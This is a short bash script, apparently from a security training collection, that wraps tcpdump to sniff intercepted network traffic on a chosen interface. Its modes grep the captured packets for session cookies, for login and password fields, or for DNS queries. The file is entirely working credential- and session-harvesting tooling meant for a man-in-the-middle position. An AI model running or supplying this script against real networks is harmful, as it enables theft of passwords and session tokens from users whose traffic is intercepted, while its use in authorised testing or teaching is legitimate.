#!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+---_----------------------------------------------------+"
echo -e "|  Adversarial Informatics Combat MITM Sniff Collection  |"
echo -e "|                 cygienesolutions.com                   |"
echo -e "|        [Usage]: ./mitm_sniff_aic.sh <INF> <TYPE>       |"
echo -e "+--------------------------------------------------------+"
echo -e "${NC}"
if [ $# == 0 ] ; then
    echo -e "${GREEN}"
    echo -e "Current sniff types: cookies|passwords|dns"
    echo ""
    echo -e "Example: ./mitm_sniff_aic.sh eth0 cookies"
    echo -e "${NC}"
    exit 1; fi

INTERFACE=$1
TYPE=$2

if [ "$TYPE" == "cookies" ]; then
	echo -e "${GREEN}"
	echo -e "Initiating Network Sniff on interface: $INTERFACE"
	echo -e "Tracing Network Traffic for: Cookie and Session Tokens"
	echo -e "${NC}"
        tcpdump -i $INTERFACE -A -s0 -l | egrep -i 'Set-Cookie|Host:|Cookie:|SESSIONSID'

elif [ "$TYPE" == "passwords"  ]; then
        echo -e "${GREEN}"
        echo -e "Initiating Network Sniff on interface: $INTERFACE"
        echo -e "Tracing Network Traffic for: Authentication Credentials "
        echo -e "${NC}"
	tcpdump -i $INTERFACE -s 0 -A -n -s0 -l | egrep -i "login|login:|login=|user|user:|user=|username|username:|username=|pwd|pwd:|pwd=|pass|pass:|pass=|passwd|passwd: |passwd=|password|password:|password="

elif [ "$TYPE" == "dns"  ]; then
        echo -e "${GREEN}"
        echo -e "Initiating Network Sniff on interface: $INTERFACE"
        echo -e "Tracing Network Traffic for: DNS Queries "
        echo -e "${NC}"
	tcpdump -i $INTERFACE -b -s 0 port 53
else
        echo "Please provide a useful sniff type."
	echo "Current Sniff Types: cookies|passwords|dns"

fi






